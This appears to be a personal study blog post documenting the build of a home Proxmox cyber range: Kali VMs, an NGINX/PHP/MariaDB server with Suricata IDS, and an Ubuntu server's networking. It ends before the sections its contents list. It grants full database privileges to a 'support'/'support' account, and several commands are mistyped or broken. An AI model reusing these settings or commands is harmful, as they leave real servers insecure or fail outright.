<!DOCTYPE html>
<html lang="en-us"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">Cyber Range Part 1 | jon112358 study Blog</title>
<meta property="og:title" content="Cyber Range Part 1 | jon112358 study Blog" />
<meta name="twitter:title" content="Cyber Range Part 1 | jon112358 study Blog" />
<meta itemprop="name" content="Cyber Range Part 1 | jon112358 study Blog" />
<meta name="application-name" content="Cyber Range Part 1 | jon112358 study Blog" />
<meta property="og:site_name" content="Jon K study blog" />

<meta name="description" content="this is a study blog where you will find what I have been up to">
<meta itemprop="description" content="this is a study blog where you will find what I have been up to" />
<meta property="og:description" content="this is a study blog where you will find what I have been up to" />
<meta name="twitter:description" content="this is a study blog where you will find what I have been up to" />

<meta property="og:locale" content="en-us" />
<meta name="language" content="en-us" />



  <meta itemprop="image" content="http://jon112358.com/" />
  <meta property="og:image" content="http://jon112358.com/" />
  <meta name="twitter:image" content="http://jon112358.com/" />
  <meta name="twitter:image:src" content="http://jon112358.com/" />




    
    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-07-29T17:04:03-0700 />
    <meta property="article:published_time" content=2024-07-29T17:04:03-0700 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "Cyber Range Part 1",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-07-29",
        "description": "",
        "wordCount":  6193 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-07-29",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "jon112358 study Blog"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.111.3">

    

    <link rel="canonical" href="http://jon112358.com/posts/cyber-range-part-1/">
    <link href="/style.min.e8353c8bf6aa84457d3c7f65980d94548f249c91e6b37b15b9f1c7e13ceed431.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://jon112358.com/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    </head>
<body data-theme = "dark" class="notransition">
<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://jon112358.com/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title>Home</title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/pages/about/">
                        About
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">Cyber Range Part 1</h1>
                
                <div class="post-meta">
                    <time datetime="2024-07-29T17:04:03-07:00" itemprop="datePublished"> Jul 29, 2024 </time>
                </div>
            </header>
            <details class="toc">
                <summary><b>Table of Contents</b></summary>
                <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction">Introduction</a></li>
  </ul>

  <ul>
    <li><a href="#proxmox">Proxmox</a></li>
    <li><a href="#vms">VM&rsquo;s</a>
      <ul>
        <li><a href="#our-offensive">Our Offensive</a></li>
        <li><a href="#our-defensive">Our Defensive</a></li>
      </ul>
    </li>
    <li><a href="#servers">Servers</a>
      <ul>
        <li><a href="#nginx-server">NGINX server</a></li>
        <li><a href="#first-application-server">First Application Server</a></li>
        <li><a href="#windows-server-2019">Windows Server 2019</a></li>
        <li><a href="#owasp-juice-shop">OWASP Juice Shop</a></li>
        <li><a href="#metasplotable-vm">Metasplotable VM</a></li>
      </ul>
    </li>
    <li><a href="#setting-up-kali-autopilot-scripts">Setting up kali-autopilot scripts</a></li>
  </ul>

  <ul>
    <li><a href="#using-zap">Using ZAP</a></li>
    <li><a href="#gvm---greenbone-security-assistant">GVM - Greenbone Security Assistant</a></li>
  </ul>

  <ul>
    <li><a href="#elkstack">ELKStack</a></li>
    <li><a href="#wazuh">Wazuh</a>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#malcom">Malcom</a></li>
  </ul>

  <ul>
    <li><a href="#opentaxii">OpenTaxii</a>
      <ul>
        <li></li>
      </ul>
    </li>
    <li><a href="#cabby-client-for-taxii">Cabby Client for TAXII</a></li>
    <li><a href="#opencti">OpenCTI</a>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#velociraptor">Velociraptor</a></li>
  </ul>
</nav>
            </details><div class="page-content">
                <h1 id="building-a-home-cyber-range-with-proxmox">Building A Home Cyber Range with Proxmox</h1>
<h2 id="introduction">Introduction</h2>
<p>In an effort to ever expand my knowledge and understanding of a live environment. I am transitions my Proxmox server from running random docker containers and VM&rsquo;s to a simulated network. I was sure where to begin and saw a LinkedIn Learning class on Kali Purple from <a href="https://www.linkedin.com/learning/instructors/malcolm-shore">Malcolm Shore</a>. It is more about building a cyber range with Proxmox.
I think this will be a good start, so this is my attempt to work out hist 4+ hours of video and explanation. I was not sure when I started but around halfway point of the class my server ran out of ram and could use more CPU Cores. Furthermore, I also had some issues with a few of the installations. At this point I stopped building everything, I was on a free trials of LinkedIn learning and simply ran out of time. A 4-hour class when you run the installations can take some time. So from there I started recording every command and system for myself to try at a later date.
This is after half a day working on troubleshooting why Kibana was not running, I realized my system issues and my time constraint.</p>
<p>That night I also decided I wanted something a little different from what the class covers. I would rather have a simulated network with an Active Directory Domain Controller with a Windows 10 and 11 box with a Windows server maybe FTP or SMB? A Linux Web server. Then add a Firewall, and Wazuh. If my hardware can handle it. This will be what I work on next.</p>
<p>For now the class Kali-Purple my Malcolm Shore.</p>
<h1 id="set-up">Set Up</h1>
<h2 id="proxmox">Proxmox</h2>
<p>I am not going to go into details on how to install and configure ProxMox, The official documentation is good and there are many videos that can walk through it step by step. (I like <a href="https://www.youtube.com/watch?v=sZcOlW-DwrU">Craft Computing</a>)
For the latest <a href="https://www.proxmox.com/en/downloads/proxmox-virtual-environment/iso">ISO</a>. Use a tool like Etcher or Rufus or Disk Imager to create a bootable USB. Then install.
I am running 7.3-3, on my old desktop see the stats bellow.</p>
<p><img src="/old/Proxmox-system-info.png" alt="Proxmox-system-info.png">
note: I may want to reduce my SWAP or use a larger boot drive when I rebuild some day. This is also the drive that by default will host my uploaded ISO&rsquo;s and LXC&rsquo;s.
I have 1T of additional hard drive space for my Cyber Range.</p>
<h2 id="vms">VM&rsquo;s</h2>
<h3 id="our-offensive">Our Offensive</h3>
<p>For this we will use <a href="https://www.kali.org/">Kali</a> - I used the installer 64-bit ISO</p>
<h5 id="most-of-this-is-the-same-for-most-of-the-vms">Most of this is the Same for Most of the VM&rsquo;s</h5>
<p>Select your local drive and in the ISO Images upload the Kali image. Now it can be used to make your VM. You can rename it to kali.iso to help find it once you have more images uploaded.</p>
<p>On the top right click the box that &ldquo;Create VM&rdquo;
For most things defualts are okay. A few noted changes.</p>
<ul>
<li>For General: Name it kali and select &lsquo;Next&rsquo;. Note: This is where you can change your VM&rsquo;s ID.</li>
<li>For OS: Select kali.iso for your image and &lsquo;Next&rsquo;.</li>
<li>For System: Use defaults and click &ldquo;Qemu Agent&rdquo;</li>
<li>Dicks: Make sure you have at lest 32GiB and the Storage pool you want.</li>
<li>CPU and Memory: Defaults are okay. Note: I like to have at lest 2 cores and 4GiB -&gt; 4096 MB. The more Cores and RAM you give it a smother feel, but the less you have for other VM&rsquo;s so it is a balance.</li>
<li>Confirm: Check it is correct. Then click &ldquo;Start after created&rdquo;.</li>
</ul>
<p>Open console and install like any other VM. Keep track of your passwords!
Install all the basic tools and I recommend a light GUI.
Yes to GRUB and once complete before reboot remove live CD/DVD for best practice. I find it often works fine without this but did have issues with Kali-Purple.
Reboot and login.</p>
<p>Malcolm recommendation of adjusting the screen size to &ldquo;1360x768&rdquo;. I agree. Then adjust you IP to a static IP by right-clicking the Network Connections Icon, select &ldquo;Wired connection 1&rdquo; tools icon go to IPv4 Settings. Change Method to Manual, Add I used 192.168.0.200, Network 24 or 255.255.255.0, Gateway of 192.168.0.1 this will be different on some networks. If I add a router I will update this appropriately. For the DNS server he used 8.8.8.8 (Google&rsquo;s). Save, then disconnect and reconnect to implement changes.</p>
<p>This is a good time to make any changes to your terminal that you prefer. Like transparency and font, size, colors. Malcolm uses Font: Hack 14 and transparency 0%. Then run</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt -y upgrade
</span></span></code></pre></div><p>I may add other things I want like confirm vim and tmux are installed and import my config files.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install vim tmux
</span></span></code></pre></div><h6 id="optional">Optional:</h6>
<p>Change your IP to use that as the last octet as your VM&rsquo;s ID. I am thinking it is best for this to be on its own sub-net to avoid issues with other devices, but it will remove your ability to monitor your home network traffic if that is part of your goal as is mine. Also, I will most likely not use this VM&rsquo;s long term. I will use my Study VM on my main system for my attacks.</p>
<h3 id="our-defensive">Our Defensive</h3>
<h4 id="kali-purple">Kali Purple</h4>
<p><a href="https://www.kali.org/get-kali/#kali-installer-images">Kali Purple</a> keep scrolling it is below Kali. I used the Recommended one.
The installation is the same with the changes mentioned below.</p>
<ul>
<li>Name it &ldquo;purple&rdquo; select the correct ISO.</li>
<li>During install select all the defensive tools.</li>
<li>I changed my them to Dark with the purple flavor and changed the terminal to dark. I also changed my IP to 192.168.0.101.
then updated.</li>
</ul>
<h5 id="kali-purple-template">Kali Purple template</h5>
<p>use the same iso as Kali Purple.
most things will be the same but change the VM ID to 200(If you used 100 like the default for your first few VM&rsquo;s, this will help keep your temples at the bottom of your list in the left-hand column in proxmox.  I
Name it &ldquo;t-purple&rdquo; set disk size to 64GiB and memory to 4096 since they will be to run bigger services.
For installing most things are the same you can name it template, and for software unselect everything except the desktop environment.<br>
The same changes to the system as before, but you don&rsquo;t need to change the network setting that will be done later.
Once updates are complete shutdown the server and convert to a template by right-clicking it and &ldquo;convert to template&rdquo;.
<img src="/old/Convert-to-template.png" alt="Convert-to-template.png"></p>
<p>I did not think about numbering when I started my build.
Now we can clone form that template.</p>
<h2 id="servers">Servers</h2>
<h3 id="nginx-server">NGINX server</h3>
<p>Clone the t-purple template for this. &ldquo;Right-click&rdquo; the template and clone.
Change name (web01) and number I used 202, and make sure you select full clone.
I changed its IP to 192.168.0.202 to match its ID.
Now install the needed software for our server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install nginx php-mysql php-fpm mariadb-client mariadb-server -y 
</span></span></code></pre></div><h6 id="note">Note:</h6>
<p>you may have notices that with Qemu copy and paste don&rsquo;t work from your clipboard. It seems there is a way to make changes to the core system to enable it. I recommend one of two options, ssh or RDP. I did ssh by running <code>sudo apt install ssh</code> then <code>sudo systemctl enable ssh --now</code> and check with <code>sudo systemctl status ssh</code>  witch ever you prefer and then to paste <code>Ctrl + Shift + v</code> or &ldquo;right-click&rdquo; -&gt; paste. If you want <a href="https://linuxize.com/post/how-to-install-xrdp-on-ubuntu-20-04/">xrdp</a> this more complete guild may be helpful.</p>
<p>Check your php version for linking with your DB <code> php -v</code> mine was PHP 8.2.18</p>
<p>In the class Malcolm uses nano, I like vim so.
To enable nginx go to <code>vim /etc/nginx/sites-enabled/default</code> scroll down to location around line 48 and change it so it looks like this. Make sure you add</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">location</span> <span class="o">/</span><span class="nx">nginx_status</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">stub_status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># and change the version in the line
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">fastcgi_pass</span> <span class="nx">unix</span><span class="o">:/</span><span class="nx">run</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="nx">php8</span><span class="o">.</span><span class="mi">2</span><span class="o">-</span><span class="nx">fpm</span><span class="o">.</span><span class="nx">sock</span><span class="p">;</span>
</span></span></code></pre></div><p>It will look something like this.
<img src="/old/nginx-sites-enabled.png" alt="nginx-sites-enabled.png"></p>
<p>Then run <code> sudo systemctl enable nginx --now</code>, running <code>--now</code> is equivalent as running <code>sudo systemctl start nginx</code>.
Followed by <code>sudo systemctl enable php8.2-fpm --now</code></p>
<p>Now to start the DB <code> sudo systemctl enable mariadb --now</code>
then run this to create a user for mysql and give it privileges,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo mysql -u root -e <span class="s2">&#34;grant all privilages on*.* to &#39;support&#39;@&#39;localhost&#39; identified by &#39;support&#39;;&#34;</span>
</span></span></code></pre></div><p>I miss type this one the first time and had to fix it double-check that the quotes are consistent on &lsquo;support&rsquo; and &rsquo;localhost&rsquo; and that your spelling is correct. It could take some time to chase down if error.
Then run <code>sudo hostnamectl set-hostname web01</code> to change the host name to &ldquo;web01&rdquo; then reboot.
Now change host name in /etc/hosts to web01
<img src="/old/web01-etc-hosts.png" alt="web01-etc-hosts.png"></p>
<p>Now we will install Suricata on this server to reduces our total number of servers running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install suricata jq gnupg2 software-properties-common
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## after it is intalled lets edite the config for suricata</span>
</span></span><span class="line"><span class="cl">sudo vim /etc/suricata/suricata.yaml
</span></span></code></pre></div><p>Change to your home net range, mine looks like this.
<img src="/old/web01-suricata-netrange.png" alt="web01-suricata-netrange.png"></p>
<p>Now fetch our default rule sets with</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo suricata-update
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo systemctl <span class="nb">enable</span> suricata --now
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## then test this with </span>
</span></span><span class="line"><span class="cl">curl http://testmynids.org/uid/index.html
</span></span><span class="line"><span class="cl"><span class="c1"># you should get a reply of </span>
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># then check the log </span>
</span></span><span class="line"><span class="cl">sudo cat /var/log/suricata/fast.log
</span></span></code></pre></div><p>mine looks like
<img src="/old/suricata-fast-log.png" alt="suricata-fast-log.png">
we now have a proxy server with IDS capability.</p>
<p>Now we will add a per-built website to our server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">	<span class="c1"># move to the web dir</span>
</span></span><span class="line"><span class="cl">	<span class="nb">cd</span> /var/www/html
</span></span><span class="line"><span class="cl">	<span class="c1"># download the project, there are other projects you can play with, navagate to the base url to see the options. But for now.</span>
</span></span><span class="line"><span class="cl">	wget https://projectworlds.in/wp-content/uploads/2021/10/Gym-Management-System-Project-in-PHP.zip
</span></span><span class="line"><span class="cl">	<span class="c1"># unzip project</span>
</span></span><span class="line"><span class="cl">	unzip Gym-Management-System-Project-in-PHP.zip
</span></span><span class="line"><span class="cl">	<span class="c1"># change project name for ease of use</span>
</span></span><span class="line"><span class="cl">	mv Gym-Management-System-Project-in-PHP.zip gym
</span></span><span class="line"><span class="cl">	<span class="c1"># change ownership show the server can access the files and run the website</span>
</span></span><span class="line"><span class="cl">	chown -R www-data:www-data gym
</span></span><span class="line"><span class="cl">	<span class="c1"># move into the project </span>
</span></span><span class="line"><span class="cl">	<span class="nb">cd</span> gym
</span></span><span class="line"><span class="cl">	<span class="c1"># list contents</span>
</span></span><span class="line"><span class="cl">	ls
</span></span><span class="line"><span class="cl">	<span class="c1"># use provided file to create the database</span>
</span></span><span class="line"><span class="cl">	<span class="c1"># look for file table.sql</span>
</span></span><span class="line"><span class="cl">	<span class="c1"># this command will create the database gym. Then use gym is like cd into gym. Then we move the tables into our gym db with tables.sql.</span>
</span></span><span class="line"><span class="cl">	msql -u root -e <span class="s2">&#34;create database gym;use gym;source table.sql&#34;</span>
</span></span><span class="line"><span class="cl">	
</span></span></code></pre></div><p>Now we need to edit &ldquo;include/db_connect.php&rdquo; changing user to &ldquo;support&rdquo; and table as &ldquo;gym&rdquo;. In the video he also changes the password to &ldquo;support&rdquo;, example see commented out line. I had an issue with permissions and this fix it for me.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="s1">&#39;psl-config.php&#39;</span><span class="p">;</span> <span class="c1">// As functions.php is not included
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$mysqli</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysql</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="s2">&#34;support&#34;</span><span class="p">,</span> <span class="s2">&#34;gym&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// $mysqli = new mysql(&#34;localhost&#34;, &#34;support&#34;, &#34;support&#34;, &#34;gym&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>We also need to edit &ldquo;include/psl-config.php&rdquo;
we are only changing &ldquo;USER&rdquo; and &ldquo;PASSWORD&rdquo; to</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s2">&#34;USER&#34;</span><span class="p">,</span> <span class="s2">&#34;support&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s2">&#34;PASSWORD&#34;</span><span class="p">,</span> <span class="s2">&#34;support&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>Now you should be able to access it at &ldquo;localhost/gym&rdquo;
I got a 403 and took some time to track down why. I found that, I had misspelled &ldquo;support&rdquo; in one of the location and had to re-run <code>chown -R www-data:www-data gym</code>. We will use this later for testing.</p>
<h3 id="first-application-server">First Application Server</h3>
<p>Lets get an <a href="https://ubuntu.com/download/server">Ubuntu Server</a>.
Upload it to proxmox as before.</p>
<p>Let&rsquo;s set the number to &ldquo;111&rdquo; and name to &ldquo;app01&rdquo; use the Ubuntu server ISO and all other setting keep as default.</p>
<p>Most things in the installation you will keep as default but name &ldquo;app01&rdquo; and chose your username and password, and you want to add the OpenSSH server now.
This will take some time if you did one core and 2GiB of RAM.
once completed reboot, and remove the image.</p>
<p>Now we login with our username:password and update</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt update <span class="o">&amp;&amp;</span> sudo apt -y upgrade
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># there are a few tools we will want to install </span>
</span></span><span class="line"><span class="cl">sudo apt install build-essential curl git wget unzip lsb-release qemu-guest-agent gnupg ca-certificates net-tools apt-transport-https python3-minimal python3-setuptools python3-pip network-manager <span class="c1"># I needed to also run &#34;--fix-missing&#34;</span>
</span></span></code></pre></div><p>Note: I have had issues with installs like this it is best to copy and text into a &ldquo;.txt&rdquo; and remove the package with an error and rerun the installation, keep track of the errors and look up the package with issues for me, I did this with <code>apt search ca-cerificates</code>, that is how I found I miss typed and forgot a &ldquo;t&rdquo; and then installed the package. Also google helps with things like that.</p>
<p>Now let&rsquo;s set the static IP by editing &ldquo;/etc/netplan/00-installer-config.yaml&rdquo;
On my install it was different. &ldquo;/etc/netplan/50-cloud-init.yaml&rdquo;
original</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">network</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">ethernets</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nt">ens18</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nt">dhcp4</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2</span><span class="w">
</span></span></span></code></pre></div><p>This did not work for me but in the video he changed to.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">network</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">ethernets</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nt">ens18</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nt">dhcp4</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nt">addresses</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="m">192.168.0.111</span><span class="l">/24]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nt">gateway4</span><span class="p">:</span><span class="w"> </span><span class="m">192.168.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nt">nameservers</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="nt">addresses</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="m">1.1.1.1</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2</span><span class="w">
</span></span></span></code></pre></div><p>Then reboot</p>
<h6 id="what-i-had-to-do">What I had to do</h6>
<p><a href="https://raspberrytips.com/set-static-ip-address-ubuntu-server/">Solution found at</a> I suggest you read for more details.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ip a <span class="c1"># for ens18 or other and your given IP mine was 192.168.0.24</span>
</span></span><span class="line"><span class="cl">ip r <span class="c1"># for your defult gateway mine was 192.168.0.1</span>
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /etc/netplan
</span></span><span class="line"><span class="cl">ls -l <span class="c1"># min had only 50-cloud-init.yaml</span>
</span></span><span class="line"><span class="cl">sudo cat 50-cloud-init.yaml <span class="c1"># to see defualts</span>
</span></span><span class="line"><span class="cl">sudo cp 50-cloud-init.yaml ~/50-cloud-init.yaml.default <span class="c1"># creat a copy of the original</span>
</span></span><span class="line"><span class="cl">sudo vim 50-cloud-init.yaml
</span></span></code></pre></div><p>Then I changed it to this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">network</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">ethernets</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">eth0</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nt">dhcp4</span><span class="p">:</span><span class="w"> </span><span class="kc">no</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nt">addresses</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">               </span>- <span class="m">192.168.0.111</span><span class="l">/24</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nt">routes</span><span class="p">:</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">               </span>- <span class="nt">to</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                 </span><span class="nt">via</span><span class="p">:</span><span class="w"> </span><span class="m">192.168.0.1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="nt">nameservers</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="nt">addresses</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="m">8.8.8.8</span><span class="p">]</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="m">2</span><span class="w">
</span></span></span></code></pre></div><p>Then check that it works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo netplan try <span class="c1"># if this works then</span>
</span></span><span class="line"><span class="cl">sudo netplan apply 
